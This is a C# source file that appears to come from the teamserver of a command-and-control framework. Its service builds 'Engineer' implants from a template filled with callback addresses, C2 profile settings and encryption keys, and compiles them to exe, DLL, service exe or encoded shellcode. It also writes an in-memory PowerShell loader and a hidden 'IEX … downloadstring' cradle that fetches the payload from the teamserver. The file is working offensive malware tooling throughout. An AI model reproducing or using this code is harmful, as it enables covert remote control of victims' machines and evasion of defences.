using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using ApiModels.Shared;
using TeamServer.Models;
using TeamServer.Models.Extras;
using TeamServer.Models.Managers;
using TeamServer.Utilities;
using ApiModels.Plugin_Interfaces;
using Microsoft.AspNetCore.Mvc.Formatters;

namespace TeamServer.Services
{

    public class EngineerService
    {
        public static bool CreateEngineers(IExtImplantCreateRequest request, out string result_message)
        {
            {
                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                // find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
                string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                //split path at bin keyword
                string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
                                                        //update each string in the array to replace \\ with the correct path seperator
                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());

                string filePath = pathSplit[0] + $"..{allPlatformPathSeperator}Engineer" + $"{allPlatformPathSeperator}Program.cs";
                string file = System.IO.File.ReadAllText(filePath);

                //usinf request.managerName to find the correct manager object and then get its BindAddress and BindPort from the manager object
                //then using the BindAddress and BindPort to update the file
                string managerName = request.managerName;
                int connectionAttempts = request.ConnectionAttempts ?? 500;
                int sleep = request.Sleep;
                SleepTypes sleepType = request.SleepType;
                string managerBindAddress = "";
                string managerBindPort = "";
                string managerConnectionAddress = "";
                string managerConnectionPort = "";
                string managerType = "";


                foreach (manager m in managerService._managers)
                {
                    if (m.Type == ManagerType.http || m.Type == ManagerType.https)
                    {
                        Httpmanager manager = (Httpmanager)m;
                        if (manager.Name == managerName)
                        {
                            managerType = manager.Type.ToString();
                            managerConnectionAddress = manager.ConnectionAddress;
                            managerConnectionPort = manager.ConnectionPort.ToString();
                            file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                            file = file.Replace("{{REPLACE_MANAGER_TYPE}}", managerType);
                            if (manager.Type == ManagerType.http)
                            {
                                file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "False");
                            }
                            else if (manager.Type == ManagerType.https)
                            {
                                file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "True");
                            }
                            //update some C2 Profile stuff 
                            file = file.Replace("{{REPLACE_URLS}}", string.Join(",", manager.c2Profile.Urls));
                            file = file.Replace("{{REPLACE_EVENT_URLS}}", string.Join(",", manager.c2Profile.EventUrls));
                            file = file.Replace("{{REPLACE_COOKIES}}", string.Join(",", manager.c2Profile.Cookies));
                            file = file.Replace("{{REPLACE_REQUEST_HEADERS}}", string.Join(",", manager.c2Profile.RequestHeaders));
                            file = file.Replace("{{REPLACE_USERAGENT}}", manager.c2Profile.UserAgent);
                            //update file with ConnectionIP and ConnectionPort from request
                            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerConnectionAddress);
                            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerConnectionPort);
                        }
                    }
                    else if (m.Type == ManagerType.tcp)
                    {
                        if (m.Name == managerName)
                        {
                            TCPManager manager = (TCPManager)m;
                            //update file to update the BindPort, ListenPort, IsLocalHost Properties 
                            file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                            file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
                            file = file.Replace("{{REPLACE_BIND_PORT}}", manager.BindPort.ToString());
                            file = file.Replace("{{REPLACE_LISTEN_PORT}}", manager.ListenPort.ToString());
                            file = file.Replace("{{REPLACE_ISLOCALHOSTONLY}}", manager.IsLocalHost.ToString());
                            //update file with ConnectionIP and ConnectionPort from request
                            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
                            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindPort);
                            if (manager.connectionMode == ConnectionMode.bind)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
                            }
                            else if (manager.connectionMode == ConnectionMode.reverse)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                                managerBindAddress = manager.ConnectionAddress;
                            }
                        }
                    }
                    else if (m.Type == ManagerType.smb)
                    {


                        if (m.Name == managerName)
                        {
                            SMBmanager manager = (SMBmanager)m;
                            //update file to update the BindPort, ListenPort, IsLocalHost Properties 
                            file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                            file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
                            file = file.Replace("{{REPLACE_NAMED_PIPE}}", manager.NamedPipe);
                            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
                            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindAddress);
                            if (manager.connectionMode == ConnectionMode.bind)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
                            }
                            else if (manager.connectionMode == ConnectionMode.reverse)
                            {
                                file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                                managerBindAddress = manager.ConnectionAddress;
                            }
                        }
                    }
                }
                //update file with connection attempts 
                file = file.Replace("{{REPLACE_CONNECTION_ATTEMPTS}}", connectionAttempts.ToString());
                //update file with sleep time
                file = file.Replace("{{REPLACE_SLEEP_TIME}}", sleep.ToString());
                file = file.Replace("{{REPLACE_SLEEP_TYPE}}", sleepType.ToString());

                if (request.WorkingHours != null)
                {
                    file = file.Replace("{{REPLACE_WORK_HOURS_START}}", request.WorkingHours.Split('-')[0]);
                    file = file.Replace("{{REPLACE_WORK_HOURS_END}}", request.WorkingHours.Split('-')[1]);
                }
                if (request.WorkingHours != null)
                {
                    Console.WriteLine($"working hours is {request.WorkingHours.Split('-')[0]} and {request.WorkingHours.Split('-')[1]}");
                }

                //update the two univerisal strings as well 
                file = file.Replace("{{REPLACE_MESSAGE_PATH_KEY}}", Encryption.UniversialMessagePathKey); // used on C2 messages 
                file = file.Replace("{{REPLACE_METADATA_KEY}}", Encryption.UniversialMetadataKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver

                //this gets updated after the first checkIn
                Console.WriteLine($"setting task encryption key to {Encryption.UniversalTaskEncryptionKey}");
                file = file.Replace("{{REPLACE_UNIQUE_TASK_KEY}}", Encryption.UniversalTaskEncryptionKey);

                file = file.Replace("{{REPLACE_KILL_DATE}}", request.KillDateTime.ToString());


                Console.WriteLine("Implant is an engineer");
                file = file.Replace("{{REPLACE_IMPLANT_TYPE}}", Encryption.EncryptImplantName("Engineer"));

                //TESTING OF DATACHUNKING 
                file = file.Replace("{{REPLACE_CHUNK_SIZE}}", request.ChunkSize.ToString());
                file = file.Replace("{{REPLACE_CHUNK_DATA}}", request.IsChunkEnabled.ToString());
                //END OF TESING CODE

                //generate code for the implant
                //if the request strings for included commands or modules is equal to all then include all commands or modules
                //otherwise only include the commands or modules that are in the request
                List<string> nonIncCommands = new();
                List<string> nonIncModules = new();
                if (!request.IncludedCommands[0].Equals("All", StringComparison.CurrentCultureIgnoreCase))
                {
                    nonIncCommands = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Commands{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedCommands.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
                }
                //extra check because modules are optional so you might have 0
                if (request.IncludedModules.Count > 0)
                {
                    if (!request.IncludedModules[0].Equals("All", StringComparison.CurrentCultureIgnoreCase))
                    {
                        nonIncModules = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Modules{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedModules.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
                    }
                }
                
                byte[] assemblyBytes = Utilities.Compile.GenerateEngCode(file, request.complieType, request.SleepType, nonIncCommands,nonIncModules);
                if (assemblyBytes is null)
                {
                    result_message = "Failed to compile Engineer, check teamServer Console for errors.";
                    return false; 
                }

                try
                {
                    //use ilMerge to merge the assembly and the protobuf dlls
                    GC.Collect();
                    GC.WaitForPendingFinalizers();

                    //if pathSplit[0]+temp does not exist then create it
                    if (!Directory.Exists(pathSplit[0] + "temp"))
                    {
                        Directory.CreateDirectory(pathSplit[0] + "temp");
                    }



                    string outputLocation = "";
                    string sourceAssemblyLocation = "";
                    if (request.complieType == ImpCompileType.exe)
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }
                    else if (request.complieType == ImpCompileType.dll)
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }
                    else if (request.complieType == ImpCompileType.serviceexe)
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }
                    else
                    {
                        outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                    }

                    var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";
                    string TopLevelFolder = pathSplit[0] + $"..{allPlatformPathSeperator}"; //Main HardHat folder 
                    //string DynamicLoadingDllPath = TopLevelFolder + "DynamicEngLoading" + allPlatformPathSeperator + "bin" + allPlatformPathSeperator + "Debug" + allPlatformPathSeperator + "DynamicEngLoading.dll";
                    //string DynamicLoadingDllPath = pathSplit[0] + "Data" + allPlatformPathSeperator + "DynamicEngLoading.dll";
                    var jsonFastLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}fastJSON.dll";
                    var dynLoadingLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}loading.dll";
                    var inputSimLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}WindowsInput.dll";
                    //var csScriptLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}CSScriptLibrary.dll";
                    string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation, dynLoadingLocation, inputSimLocation};

                    //?? denotes that if this is null then use the second value otherwise use the first value
                    if(request.IsPostEx ?? false)
                    {
                        outputLocation = outputLocation.Replace("Engineer", "PostExEngineer");
                    }
                    Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);


                    Console.WriteLine("Merged Engineer and needed dlls");
                    var updatedExe = System.IO.File.ReadAllBytes(outputLocation);
                    //if file exists for delete it so write all bytes can work
                    //GC.Collect();
                    //GC.WaitForPendingFinalizers();
                    ////make a copy of the engineer in the temp folder to use for some commands later
                    //System.IO.File.WriteAllBytes(sourceAssemblyLocation, updatedExe);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    result_message = "Merging of exe and needed dlls failed, check teamServer Console for errors.";
                    return false;
                }

                //create a CompiledImplant object to store the compiled implant
                CompiledImplant _compImp = new()
                {
                    Id = Guid.NewGuid().ToString(),
                    Name = $"Engineer_{managerName}",
                    ImplantType = "Engineer",
                    ManagerName = managerName,
                    Sleep = request.Sleep.ToString(),
                    SleepType = request.SleepType.ToString(),
                    CompileType = request.complieType.ToString(),
                    CompileDateTime = DateTime.UtcNow.ToString(),
                    KillDateTime = request.KillDateTime.ToString(),
                    IncludedCommands = request.IncludedCommands,
                    IncludedModules = request.IncludedModules,
                    ConnectionAttempts = request.ConnectionAttempts.ToString()
                };
                if(_compImp.CompileType == "Service")
                {
                    _compImp.SavedPath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}{_compImp.ImplantType}_{managerName}_Service.exe";
                }
                else if (_compImp.CompileType == "shellcode")
                {
                    _compImp.SavedPath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}{_compImp.ImplantType}_{managerName}_shellcode.bin";
                }
                else
                {
                    _compImp.SavedPath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}{_compImp.ImplantType}_{managerName}.{_compImp.CompileType}";
                }

                HardHatHub.AddCompiledImplant(_compImp);

                if (request.complieType == ImpCompileType.exe)
                {
                    try
                    {
                        //if enviornment is windows then run confuse 
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                        {
                            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                        }
                        string compiledEngLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {compiledEngLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                        Thread.Sleep(10);
                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe already exists.";
                        return false;
                    }
                }
                else if (request.complieType == ImpCompileType.serviceexe)
                {
                    try
                    {
                        //if enviornment is windows then run confuse 
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                        {
                            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                        }
                        string compiledEngLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}_Service.exe";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                        Thread.Sleep(10);
                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe";
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe already exists.";
                        return false;
                    }
                }
                else if (request.complieType == ImpCompileType.dll)
                {
                    try
                    {
                        //if enviornment is windows then run confuse 
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                        {
                            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                        }
                        string compiledEngLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                        Thread.Sleep(10);
                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll already exists.";
                        return false;
                    }
                }
                else if (request.complieType == ImpCompileType.shellcode)
                {
                    try
                    {
                        //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
                        var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                        var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
                        if (request.EncodeShellcode != null && (bool)request.EncodeShellcode)
                        {
                            var encoded_shellcode = Shellcode.EncodeShellcode(shellcode);
                            System.IO.File.WriteAllBytes(
                                pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode_sgn.bin",
                                encoded_shellcode);
                        }
                        else
                        {
                            System.IO.File.WriteAllBytes(
                                pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin",
                                shellcode);
                        }

                        //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                        string shellLocation = $"{pathSplit[0]}..{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin";
                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {shellLocation}", Status = "success" });
                        LoggingService.EventLogger.Information("Engineer shellcode written to {shellLocation}", shellLocation);

                        result_message = "Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin";
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        result_message = "Engineer shellcode " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.bin already exists.";
                        return false; 
                    }
                }
                //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
                else if (request.complieType == ImpCompileType.powershellcmd)
                {
                    try
                    {
                        byte[] Mergedengineer = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                        string binaryb64 = Convert.ToBase64String(Mergedengineer);
                        string powershellCommand = $"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{binaryb64}\"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";
                        //write the powershell command to a text file 
                        System.IO.File.WriteAllText(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
                        System.IO.File.WriteAllText(pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
                        string psCommandPath = pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt";

                        HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
                        LoggingService.EventLogger.Information("Engineer powershell command written to {psCommandPath}", psCommandPath);
                        HardHatHub.AddPsCommand($"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://TeamserverIp:HttpManagerPort/Engineer_{managerName}_pscmd.txt'))\"");
                        result_message = "Powershell command written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt";
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        result_message = "powershell cmd generation failed";
                        return false;
                    }
                }
                result_message = "Failed to compile Engineer, check teamServer Console for errors.";
                return false;

            }
        }

    }
}
